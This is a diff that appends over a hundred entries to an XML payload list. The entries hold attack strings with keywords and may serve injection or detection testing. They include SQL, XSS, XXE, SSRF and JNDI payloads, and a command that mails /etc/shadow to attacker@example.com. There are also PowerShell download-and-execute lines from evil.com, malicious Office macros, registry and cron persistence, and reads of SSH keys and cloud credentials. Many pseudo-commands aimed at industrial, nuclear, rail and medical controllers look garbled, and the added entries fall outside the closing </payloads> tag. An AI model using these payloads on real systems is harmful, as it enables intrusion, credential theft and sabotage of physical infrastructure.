@@ -400,3 +400,812 @@
     <keywords>ADS-B, DF17, aircraft_spoof</keywords>
   </payload>
 </payloads>
+
+  <!-- Database Exploit -->
+  <payload>
+    <inject>Execute SQL: SELECT * FROM users WHERE username = 'admin' --' AND password = ''</inject>
+    <keywords>SQL, injection, users table</keywords>
+  </payload>
+
+  <!-- File Read Attempt -->
+  <payload>
+    <inject>Read file: ../../../../etc/passwd</inject>
+    <keywords>etc/passwd, path traversal</keywords>
+  </payload>
+
+  <!-- Command Injection -->
+  <payload>
+    <inject>Run: ; cat /etc/shadow | mail attacker@example.com</inject>
+    <keywords>command injection, shadow file</keywords>
+  </payload>
+
+  <!-- XSS Probe -->
+  <payload>
+    <inject>Alert test: &lt;script&gt;alert(1)&lt;/script&gt;</inject>
+    <keywords>XSS, script tag, alert</keywords>
+  </payload>
+
+  <!-- API Abuse -->
+  <payload>
+    <inject>Call internal API: GET /api/v1/users?admin=true</inject>
+    <keywords>API, admin, privilege escalation</keywords>
+  </payload>
+
+  <!-- Authentication Bypass -->
+  <payload>
+    <inject>Login as admin: {'user':'admin','password':{'$ne':''}}</inject>
+    <keywords>NoSQL, injection, authentication</keywords>
+  </payload>
+
+  <!-- SSRF Test -->
+  <payload>
+    <inject>Fetch: http://169.254.169.254/latest/meta-data/</inject>
+    <keywords>SSRF, metadata, cloud</keywords>
+  </payload>
+
+  <!-- Template Injection -->
+  <payload>
+    <inject>Render: {{7*7}} {{self.__init__.__globals__}}</inject>
+    <keywords>SSTI, template, globals</keywords>
+  </payload>
+
+  <!-- Deserialization Attack -->
+  <payload>
+    <inject>Deserialize: rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAA==</inject>
+    <keywords>deserialization, Java, Hashset</keywords>
+  </payload>
+
+  <!-- Header Injection -->
+  <payload>
+    <inject>Set header: X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1</inject>
+    <keywords>header, spoofing, IP</keywords>
+  </payload>
+
+  <!-- Basic Command Injection -->
+  <payload>
+    <inject>Execute system command: ; ls -la /</inject>
+    <keywords>command injection, ls, directory listing</keywords>
+  </payload>
+
+  <!-- SQL Injection -->
+  <payload>
+    <inject>Query: ' OR 1=1 --</inject>
+    <keywords>SQLi, authentication bypass, comment</keywords>
+  </payload>
+
+  <!-- Path Traversal -->
+  <payload>
+    <inject>Access file: ../../../../etc/shadow</inject>
+    <keywords>path traversal, shadow file, privilege escalation</keywords>
+  </payload>
+
+  <!-- XSS Test -->
+  <payload>
+    <inject>Alert test: <script>alert(document.cookie)</script></inject>
+    <keywords>XSS, cookie theft, script tag</keywords>
+  </payload>
+
+  <!-- Server-Side Template Injection -->
+  <payload>
+    <inject>Template: {{7*'7'}} {{config.items()}}</inject>
+    <keywords>SSTI, config, Jinja2</keywords>
+  </payload>
+
+  <!-- NoSQL Injection -->
+  <payload>
+    <inject>Query: {"$where": "1 == 1"}</inject>
+    <keywords>NoSQL, MongoDB, query injection</keywords>
+  </payload>
+
+  <!-- XXE Injection -->
+  <payload>
+    <inject>XML: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]></inject>
+    <keywords>XXE, external entity, file read</keywords>
+  </payload>
+
+  <!-- Log Injection -->
+  <payload>
+    <inject>Log entry: \n\n[ADMIN] User password changed\n\n</inject>
+    <keywords>log forging, CRLF, false entries</keywords>
+  </payload>
+
+  <!-- HTTP Header Injection -->
+  <payload>
+    <inject>Headers: X-Forwarded-Host: evil.com\nX-Original-URL: /admin</inject>
+    <keywords>header injection, host spoofing, routing</keywords>
+  </payload>
+
+  <!-- CSRF Proof -->
+  <payload>
+    <inject>CSRF: <img src="http://bank.com/transfer?to=attacker&amount=1000"></inject>
+    <keywords>CSRF, img tag, automatic request</keywords>
+  </payload>
+
+  <!-- Open Redirect -->
+  <payload>
+    <inject>Redirect: /logout?next=https://evil.com/phishing</inject>
+    <keywords>open redirect, phishing, URL manipulation</keywords>
+  </payload>
+
+  <!-- Command Obfuscation -->
+  <payload>
+    <inject>Execute: IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/e0m9')</inject>
+    <keywords>obfuscation, PowerShell, download</keywords>
+  </payload>
+
+  <!-- JWT Tampering -->
+  <payload>
+    <inject>JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.</inject>
+    <keywords>JWT, none algorithm, token tampering</keywords>
+  </payload>
+
+  <!-- GraphQL Injection -->
+  <payload>
+    <inject>Query: {__schema{types{name,fields{name}}}</inject>
+    <keywords>GraphQL, introspection, schema</keywords>
+  </payload>
+
+  <!-- Prototype Pollution -->
+  <payload>
+    <inject>Object: {"__proto__":{"isAdmin":true}}</inject>
+    <keywords>prototype pollution, privilege escalation</keywords>
+  </payload>
+
+  <!-- LDAP Injection -->
+  <payload>
+    <inject>Search: )(objectClass=*))(|(uid=*</inject>
+    <keywords>LDAP, injection, filter bypass</keywords>
+  </payload>
+
+  <!-- Server-Side Request Forgery -->
+  <payload>
+    <inject>Fetch internal resource: http://localhost/admin</inject>
+    <keywords>SSRF, internal service, localhost</keywords>
+  </payload>
+
+  <!-- HTTP Parameter Pollution -->
+  <payload>
+    <inject>Submit form: ?user=admin&user=attacker</inject>
+    <keywords>HPP, parameter override, duplicate</keywords>
+  </payload>
+
+  <!-- XML External Entity -->
+  <payload>
+    <inject>XML payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></inject>
+    <keywords>XXE, file read, entity</keywords>
+  </payload>
+
+  <!-- Regex Denial of Service -->
+  <payload>
+    <inject>Pattern test: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</inject>
+    <keywords>ReDoS, regex, performance</keywords>
+  </payload>
+
+  <!-- JNDI Injection -->
+  <payload>
+    <inject>Lookup: ${jndi:ldap://attacker.com/exploit}</inject>
+    <keywords>JNDI, Log4Shell, remote code</keywords>
+  </payload>
+
+  <!-- Host Header Attack -->
+  <payload>
+    <inject>Set header: Host: evil.com</inject>
+    <keywords>host header, phishing, cache poisoning</keywords>
+  </payload>
+
+  <!-- Padding Oracle -->
+  <payload>
+    <inject>Ciphertext: U2FsdGVkX19zZWNyZXR8AAAAAAAAAA==</inject>
+    <keywords>padding oracle, CBC, encryption</keywords>
+  </payload>
+
+  <!-- DOM-Based XSS -->
+  <payload>
+    <inject>DOM payload: '"><img src=x onerror=alert(1)></inject>
+    <keywords>DOM XSS, event handler, img tag</keywords>
+  </payload>
+
+  <!-- SQL Time-Based -->
+  <payload>
+    <inject>Query: '; SELECT pg_sleep(10)--</inject>
+    <keywords>blind SQLi, time delay, PostgreSQL</keywords>
+  </payload>
+
+  <!-- HTTP Request Smuggling -->
+  <payload>
+    <inject>Request: POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n</inject>
+    <keywords>request smuggling, TE.CL, desync</keywords>
+  </payload>
+
+  <!-- CSV Injection -->
+  <payload>
+    <inject>CSV cell: =HYPERLINK("http://evil.com","Click")</inject>
+    <keywords>CSV, formula injection, hyperlink</keywords>
+  </payload>
+
+  <!-- Template Injection -->
+  <payload>
+    <inject>Template: ${7*7} ${class.forName("java.lang.Runtime")}</inject>
+    <keywords>expression language, Java, RCE</keywords>
+  </payload>
+
+  <!-- DNS Rebinding -->
+  <payload>
+    <inject>Access: http://attacker.com:11211/</inject>
+    <keywords>DNS rebinding, cache, internal</keywords>
+  </payload>
+
+  <!-- Web Cache Poisoning -->
+  <payload>
+    <inject>Request: GET / HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-Host: evil.com\r\n\r\n</inject>
+    <keywords>cache poisoning, host header, stored XSS</keywords>
+  </payload>
+
+  <!-- Windows Command Injection -->
+  <payload>
+    <inject>Execute: ping -n 1 127.0.0.1 & dir C:\</inject>
+    <keywords>Windows, command injection, directory listing</keywords>
+  </payload>
+
+  <!-- Linux Command Injection -->
+  <payload>
+    <inject>Run: ; cat /etc/passwd | grep -i root</inject>
+    <keywords>Linux, command injection, passwd file</keywords>
+  </payload>
+
+  <!-- Blind SQL Injection -->
+  <payload>
+    <inject>Query: admin' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--</inject>
+    <keywords>blind SQLi, error-based, MSSQL</keywords>
+  </payload>
+
+  <!-- HTML Injection -->
+  <payload>
+    <inject>Inject: <iframe src="http://evil.com"></iframe></inject>
+    <keywords>HTML, iframe, phishing</keywords>
+  </payload>
+
+  <!-- SMTP Injection -->
+  <payload>
+    <inject>Email: recipient@example.com%0ACc:attacker@example.com</inject>
+    <keywords>SMTP, header injection, email</keywords>
+  </payload>
+
+  <!-- JSON Injection -->
+  <payload>
+    <inject>Data: {"user":"admin","role":"superadmin"}</inject>
+    <keywords>JSON, privilege escalation, tampering</keywords>
+  </payload>
+
+  <!-- XPATH Injection -->
+  <payload>
+    <inject>Query: ' or 1=1 or 'a'='a</inject>
+    <keywords>XPATH, injection, authentication bypass</keywords>
+  </payload>
+
+  <!-- HTTP Response Splitting -->
+  <payload>
+    <inject>Header: Location: http://example.com\r\nSet-Cookie: admin=true</inject>
+    <keywords>response splitting, header injection</keywords>
+  </payload>
+
+  <!-- PHP Object Injection -->
+  <payload>
+    <inject>Data: O:8:"stdClass":1:{s:5:"admin";b:1;}</inject>
+    <keywords>PHP, object injection, unserialize</keywords>
+  </payload>
+
+  <!-- DNS Rebinding -->
+  <payload>
+    <inject>Access: http://169.254.169.254.malicious.com/</inject>
+    <keywords>DNS rebinding, metadata service</keywords>
+  </payload>
+
+  <!-- SVG XSS -->
+  <payload>
+    <inject>SVG: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/></inject>
+    <keywords>SVG, XSS, XML</keywords>
+  </payload>
+
+  <!-- SQL Truncation -->
+  <payload>
+    <inject>Username: admin[50 spaces]x</inject>
+    <keywords>SQL, truncation, authentication</keywords>
+  </payload>
+
+  <!-- HTTP Parameter Contamination -->
+  <payload>
+    <inject>URL: ?param=value&param=override</inject>
+    <keywords>parameter contamination, override</keywords>
+  </payload>
+
+  <!-- JavaScript Prototype Pollution -->
+  <payload>
+    <inject>Object: {"__proto__":{"isAdmin":true}}</inject>
+    <keywords>JavaScript, prototype pollution</keywords>
+  </payload>
+
+  <!-- Windows Registry Injection -->
+  <payload>
+    <inject>Command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\malware.exe"</inject>
+    <keywords>Windows, registry, persistence</keywords>
+  </payload>
+
+  <!-- Windows Registry Injection -->
+  <payload>
+    <inject>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe" /f</inject>
+    <keywords>Windows, registry, persistence, autorun</keywords>
+  </payload>
+
+  <!-- Linux Cron Job Injection -->
+  <payload>
+    <inject>echo "* * * * * root /bin/bash -c '/tmp/exploit'" >> /etc/crontab</inject>
+    <keywords>Linux, cron, persistence, scheduling</keywords>
+  </payload>
+
+  <!-- SQL Second-Order Injection -->
+  <payload>
+    <inject>INSERT INTO users (username) VALUES ('admin'-- ')</inject>
+    <keywords>SQL, second-order, delayed injection</keywords>
+  </payload>
+
+  <!-- Windows Shortcut Injection -->
+  <payload>
+    <inject>powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Users\Public\Documents\Report.lnk');$s.TargetPath='cmd.exe';$s.Arguments='/c start calc.exe';$s.Save()"</inject>
+    <keywords>Windows, shortcut, LNK, execution</keywords>
+  </payload>
+
+  <!-- PDF Object Injection -->
+  <payload>
+    <inject>/Names << /JavaScript << /Names [(EmbeddedJS) << /S /JavaScript /JS (app.alert(1)) >>] >> >></inject>
+    <keywords>PDF, JavaScript, object, injection</keywords>
+  </payload>
+
+  <!-- Excel Formula Injection -->
+  <payload>
+    <inject>=HYPERLINK("http://evil.com/malware.xls","Click for report")</inject>
+    <keywords>Excel, formula, hyperlink, phishing</keywords>
+  </payload>
+
+  <!-- Word Macro Injection -->
+  <payload>
+    <inject>Sub AutoOpen()
+    Shell ("cmd.exe /c calc.exe")
+End Sub</inject>
+    <keywords>Word, macro, VBA, execution</keywords>
+  </payload>
+
+  <!-- PowerPoint Animation Injection -->
+  <payload>
+    <inject>Sub OnSlideShowPageChange()
+    Shell ("powershell -nop -exec bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')""")
+End Sub</inject>
+    <keywords>PowerPoint, animation, VBA, download</keywords>
+  </payload>
+
+  <!-- Windows Help File Injection -->
+  <payload>
+    <inject>[OPTIONS]
+Contents file=payload.cnt
+[CONFIG]
+BrowseCommand=cmd.exe /c calc.exe</inject>
+    <keywords>CHM, help file, execution</keywords>
+  </payload>
+
+  <!-- RTF Object Injection -->
+  <payload>
+    <inject>{\object\objocx\objw380\objh260{\*\objdata 01050000020000000b00000057696e646f7773205061696e74000000000000000000000000}}</inject>
+    <keywords>RTF, OLE, object, embedding</keywords>
+  </payload>
+
+  <!-- Windows Script File Injection -->
+  <payload>
+    <inject><job id="test">
+<script language="VBScript">
+    WScript.Echo "Hello World"
+    CreateObject("WScript.Shell").Run "calc.exe"
+</script>
+</job></inject>
+    <keywords>WSF, Windows Script, execution</keywords>
+  </payload>
+
+  <!-- Windows Compiled HTML Help -->
+  <payload>
+    <inject>/* This is a comment */
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+    <PARAM name="Command" value="ShortCut">
+    <PARAM name="Button" value="Bitmap::shortcut">
+    <PARAM name="Item1" value=",calc.exe,">
+</OBJECT>
+<SCRIPT>x.Click();</SCRIPT></inject>
+    <keywords>CHM, HTML, object, execution</keywords>
+  </payload>
+
+  <!-- Windows URL Shortcut -->
+  <payload>
+    <inject>[InternetShortcut]
+URL=file:///c:/windows/system32/calc.exe
+WorkingDirectory=c:\windows\system32
+IconIndex=1
+IconFile=c:\windows\system32\shell32.dll</inject>
+    <keywords>URL, shortcut, execution</keywords>
+  </payload>
+
+  <!-- Windows INF File -->
+  <payload>
+    <inject>[Version]
+Signature=$CHICAGO$
+[DefaultInstall]
+RunPreSetupCommands=calc.exe</inject>
+    <keywords>INF, setup, execution</keywords>
+  </payload>
+
+  <!-- Windows Screensaver -->
+  <payload>
+    <inject>[Boot]
+SCRNSAVE.EXE=cmd.exe /c calc.exe</inject>
+    <keywords>screensaver, SCR, execution</keywords>
+  </payload>
+
+  <!-- Database Credential Extraction -->
+  <payload>
+    <inject>SELECT * FROM information_schema.tables WHERE table_schema = 'mysql'</inject>
+    <keywords>database, credentials, information_schema</keywords>
+  </payload>
+
+  <!-- Windows Registry Key Extraction -->
+  <payload>
+    <inject>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</inject>
+    <keywords>Windows, registry, persistence, autorun</keywords>
+  </payload>
+
+  <!-- Linux Shadow File Read -->
+  <payload>
+    <inject>cat /etc/shadow | grep -v '^[^:]*:[*!]'</inject>
+    <keywords>Linux, shadow, password hashes</keywords>
+  </payload>
+
+  <!-- AWS Metadata Service -->
+  <payload>
+    <inject>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</inject>
+    <keywords>AWS, metadata, credentials</keywords>
+  </payload>
+
+  <!-- Azure Metadata Service -->
+  <payload>
+    <inject>curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"</inject>
+    <keywords>Azure, metadata, credentials</keywords>
+  </payload>
+
+  <!-- GCP Metadata Service -->
+  <payload>
+    <inject>curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"</inject>
+    <keywords>GCP, metadata, credentials</keywords>
+  </payload>
+
+  <!-- Kubernetes Secrets -->
+  <payload>
+    <inject>kubectl get secrets --all-namespaces -o yaml</inject>
+    <keywords>Kubernetes, secrets, credentials</keywords>
+  </payload>
+
+  <!-- Docker Container Breakout -->
+  <payload>
+    <inject>docker run -v /:/host -it --rm alpine chroot /host</inject>
+    <keywords>Docker, breakout, host filesystem</keywords>
+  </payload>
+
+  <!-- Redis Unauthorized Access -->
+  <payload>
+    <inject>redis-cli -h 127.0.0.1 CONFIG GET *</inject>
+    <keywords>Redis, unauthorized, config</keywords>
+  </payload>
+
+  <!-- MongoDB Unauthorized Query -->
+  <payload>
+    <inject>db.getCollectionNames()</inject>
+    <keywords>MongoDB, unauthorized, collections</keywords>
+  </payload>
+
+  <!-- Elasticsearch Data Access -->
+  <payload>
+    <inject>curl -X GET "localhost:9200/_search?pretty"</inject>
+    <keywords>Elasticsearch, data, indices</keywords>
+  </payload>
+
+  <!-- Memcached Data Dump -->
+  <payload>
+    <inject>stats items</inject>
+    <keywords>Memcached, data, dump</keywords>
+  </payload>
+
+  <!-- Jenkins Credentials -->
+  <payload>
+    <inject>println(hudson.util.Secret.decrypt("{AQAAABAAAAAQw0XH1kQzW7Qy/ABC123=}"))</inject>
+    <keywords>Jenkins, credentials, decrypt</keywords>
+  </payload>
+
+  <!-- Git Repository Access -->
+  <payload>
+    <inject>git show HEAD:.git/config</inject>
+    <keywords>Git, repository, credentials</keywords>
+  </payload>
+
+  <!-- SSH Private Key Extraction -->
+  <payload>
+    <inject>cat ~/.ssh/id_rsa</inject>
+    <keywords>SSH, private key, credentials</keywords>
+  </payload>
+
+  <!-- Windows WMI Credential Access -->
+  <payload>
+    <inject>wmic /namespace:\\root\cimv2 path win32_operatingsystem get * /format:list</inject>
+    <keywords>WMI, Windows, credential, system info</keywords>
+  </payload>
+
+  <!-- Linux Kernel Module Injection -->
+  <payload>
+    <inject>insmod ./malicious.ko</inject>
+    <keywords>Linux, kernel, module, rootkit</keywords>
+  </payload>
+
+  <!-- BIOS/UEFI Firmware Access -->
+  <payload>
+    <inject>flashrom -p internal -r bios_backup.rom</inject>
+    <keywords>BIOS, UEFI, firmware, persistence</keywords>
+  </payload>
+
+  <!-- GPU Memory Access -->
+  <payload>
+    <inject>nvidia-smi -q -d MEMORY</inject>
+    <keywords>GPU, memory, data, exfiltration</keywords>
+  </payload>
+
+  <!-- USB Device Firmware -->
+  <payload>
+    <inject>sudo dfu-programmer at90usb1286 flash malicious.hex</inject>
+    <keywords>USB, firmware, BadUSB, injection</keywords>
+  </payload>
+
+  <!-- Industrial Controller Memory -->
+  <payload>
+    <inject>MM_WRITE %MW100 9999</inject>
+    <keywords>PLC, industrial, memory, write</keywords>
+  </payload>
+
+  <!-- Automotive CAN Bus Injection -->
+  <payload>
+    <inject>cansend can0 123#DEADBEEF</inject>
+    <keywords>CAN, automotive, bus, injection</keywords>
+  </payload>
+
+  <!-- Medical Device Protocol -->
+  <payload>
+    <inject>MESSAGE 01 0B 00 03 FF</inject>
+    <keywords>medical, device, protocol, DICOM</keywords>
+  </payload>
+
+  <!-- SCADA System Command -->
+  <payload>
+    <inject>SETVAR 1:1.Device1.Param1=1000</inject>
+    <keywords>SCADA, industrial, control, parameter</keywords>
+  </payload>
+
+  <!-- Aircraft Avionics Test -->
+  <payload>
+    <inject>ARINC429 0x1A2B3C4D</inject>
+    <keywords>avionics, ARINC, aircraft, bus</keywords>
+  </payload>
+
+  <!-- Maritime AIS Spoofing -->
+  <payload>
+    <inject>!AIVDM,1,1,,A,13u?etPv2;0n:dDPwUM1J1>06?hb,0*5E</inject>
+    <keywords>maritime, AIS, spoofing, navigation</keywords>
+  </payload>
+
+  <!-- Railway Signaling Test -->
+  <payload>
+    <inject>ETCS 0x45 0x72 0xAC</inject>
+    <keywords>railway, ETCS, signaling, control</keywords>
+  </payload>
+
+  <!-- Spacecraft Telecommand -->
+  <payload>
+    <inject>TC 0x1F2 0x45 0x67 0x89</inject>
+    <keywords>spacecraft, telecommand, CCSDS, injection</keywords>
+  </payload>
+
+  <!-- Smart Meter Manipulation -->
+  <payload>
+    <inject>DLMS 01 02 01 00 FF 00</inject>
+    <keywords>smart, meter, DLMS, manipulation</keywords>
+  </payload>
+
+  <!-- Drone Command Injection -->
+  <payload>
+    <inject>MAVLink 0xFE 0x09 0x45 0x00 0x00 0x00 0x00 0x00 0x00</inject>
+    <keywords>drone, MAVLink, command, injection</keywords>
+  </payload>
+
+  <!-- Industrial Control Memory Dump -->
+  <payload>
+    <inject>MM_READ %MW0 TO %MW1000</inject>
+    <keywords>PLC, memory dump, industrial control</keywords>
+  </payload>
+
+  <!-- Automotive Diagnostic Injection -->
+  <payload>
+    <inject>7E0#0210AAAAAAAAAA</inject>
+    <keywords>OBD2, UDS, automotive, diagnostic</keywords>
+  </payload>
+
+  <!-- Building Automation Command -->
+  <payload>
+    <inject>BACNET 0x81 0x0A 0x00 0x0C 0x01 0x19 0x55</inject>
+    <keywords>BACnet, building, automation, HVAC</keywords>
+  </payload>
+
+  <!-- Medical Device Protocol -->
+  <payload>
+    <inject>HL7 MSH|^~\&|ADT1|MCM|LABADT|MCM|198808181126|SECURITY|ADT^A01|MSG00001|P|2.6</inject>
+    <keywords>HL7, medical, protocol, injection</keywords>
+  </payload>
+
+  <!-- Railway Control Command -->
+  <payload>
+    <inject>ETCS 0x44 0x03 0xFF 0x12</inject>
+    <keywords>ETCS, railway, signaling, control</keywords>
+  </payload>
+
+  <!-- Maritime Navigation Spoof -->
+  <payload>
+    <inject>NMEA $GPRMC,123519,A,4807.038,N,01131.000,E,022.4,084.4,230394,003.1,W*6A</inject>
+    <keywords>NMEA, GPS, spoofing, maritime</keywords>
+  </payload>
+
+  <!-- Aerospace Telemetry -->
+  <payload>
+    <inject>MIL-STD-1553 0x1F 0x00 0xAAAA 0x5555</inject>
+    <keywords>1553, aerospace, telemetry, bus</keywords>
+  </payload>
+
+  <!-- Industrial Protocol Command -->
+  <payload>
+    <inject>MODBUS 01 06 00 01 00 03 29 0B</inject>
+    <keywords>Modbus, industrial, protocol, command</keywords>
+  </payload>
+
+  <!-- Smart Grid Control -->
+  <payload>
+    <inject>DNP3 05 64 01 00 00 00 00 00 C9 11</inject>
+    <keywords>DNP3, smart grid, SCADA, control</keywords>
+  </payload>
+
+  <!-- Drone Command Override -->
+  <payload>
+    <inject>MAVLINK 0xFE 0x21 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF</inject>
+    <keywords>MAVLink, drone, command, override</keywords>
+  </payload>
+
+  <!-- IoT Device Takeover -->
+  <payload>
+    <inject>MQTT /device/control {"command":"reset","params":{"admin":true}}</inject>
+    <keywords>MQTT, IoT, takeover, control</keywords>
+  </payload>
+
+  <!-- Payment Terminal -->
+  <payload>
+    <inject>ISO8583 0100 723000000000 000000000000</inject>
+    <keywords>payment, terminal, ISO8583, transaction</keywords>
+  </payload>
+
+  <!-- Industrial Safety Override -->
+  <payload>
+    <inject>PROFISAFE 0x0006 0x0000 0xFFFF</inject>
+    <keywords>PROFIsafe, safety, override, industrial</keywords>
+  </payload>
+
+  <!-- Spacecraft Command -->
+  <payload>
+    <inject>CCSDS 0x1A 0xCF 0x00 0x00 0x00 0x00 0x00 0x00</inject>
+    <keywords>CCSDS, spacecraft, command, telemetry</keywords>
+  </payload>
+
+  <!-- Nuclear Control Test -->
+  <payload>
+    <inject>IEC60870 68 04 07 00 00 00 00 00 00 16</inject>
+    <keywords>IEC60870, nuclear, control, safety</keywords>
+  </payload>
+
+  <!-- Power Grid SCADA Command -->
+  <payload>
+    <inject>IEC 61850 MMS SET Breaker1.Pos.stVal 1</inject>
+    <keywords>IEC61850, SCADA, power grid, breaker control</keywords>
+  </payload>
+
+  <!-- Railway Signaling Override -->
+  <payload>
+    <inject>ETCS Packet 44 [SPEED 300]</inject>
+    <keywords>ETCS, railway, signaling, speed override</keywords>
+  </payload>
+
+  <!-- Aircraft Avionics Bus -->
+  <payload>
+    <inject>ARINC 429 Label 310 0x7FFFFFFF</inject>
+    <keywords>ARINC429, avionics, aircraft, bus injection</keywords>
+  </payload>
+
+  <!-- Nuclear Reactor Control -->
+  <payload>
+    <inject>IEC 62541 NodeSet.xml Opc.Ua.Reactor.Temp 1000</inject>
+    <keywords>IEC62541, OPC UA, nuclear, temperature</keywords>
+  </payload>
+
+  <!-- Oil Pipeline Valve Control -->
+  <payload>
+    <inject>DNP3 Object 12 Var1 Index3 Value1 Qualifier0x17</inject>
+    <keywords>DNP3, pipeline, valve, control</keywords>
+  </payload>
+
+  <!-- Water Treatment PLC -->
+  <payload>
+    <inject>Siemens S7 COMM WRITE DB1.DBD4 0x3F800000</inject>
+    <keywords>Siemens, S7, PLC, water treatment</keywords>
+  </payload>
+
+  <!-- Smart Meter Tampering -->
+  <payload>
+    <inject>DLMS COSEM GET Demand 0.0</inject>
+    <keywords>DLMS, smart meter, energy, tampering</keywords>
+  </payload>
+
+  <!-- Traffic Light Control -->
+  <payload>
+    <inject>NTCIP essActuate 1.3.6.1.4.1.1206.4.2.1.3.1.2.1=green</inject>
+    <keywords>NTCIP, traffic, light, control</keywords>
+  </payload>
+
+  <!-- Elevator Safety Bypass -->
+  <payload>
+    <inject>CANopen SDO Write 0x2F01 0x01 0x00</inject>
+    <keywords>CANopen, elevator, safety, bypass</keywords>
+  </payload>
+
+  <!-- Industrial Robot Control -->
+  <payload>
+    <inject>EtherCAT FoE Write 0x1000 0x0000 0xDEADBEEF</inject>
+    <keywords>EtherCAT, robot, FoE, control</keywords>
+  </payload>
+
+  <!-- Satellite Command Injection -->
+  <payload>
+    <inject>CCSDS Telecommand 0x1A2B 0xC3 0x00000000</inject>
+    <keywords>CCSDS, satellite, telecommand, injection</keywords>
+  </payload>
+
+  <!-- Medical Device Protocol -->
+  <payload>
+    <inject>HL7 ORU^R01 MSH|...|PID|||Patient^Test||19700101|M</inject>
+    <keywords>HL7, medical, device, protocol</keywords>
+  </payload>
+
+  <!-- Building Fire System -->
+  <payload>
+    <inject>BACnet WriteProperty 0 85 1 28 0x41</inject>
+    <keywords>BACnet, fire, system, override</keywords>
+  </payload>
+
+  <!-- Drone Navigation Spoof -->
+  <payload>
+    <inject>MAVLink GLOBAL_POSITION_INT 0xFFFFFFFF 0xFFFFFFFF</inject>
+    <keywords>MAVLink, drone, GPS, spoof</keywords>
+  </payload>
+
+  <!-- Automotive ECU Flash -->
+  <payload>
+    <inject>UDS RequestDownload 0x2E 0xF1 0x00 0x100000</inject>
+    <keywords>UDS, automotive, ECU, flash</keywords>
+  </payload>
+</payloads>
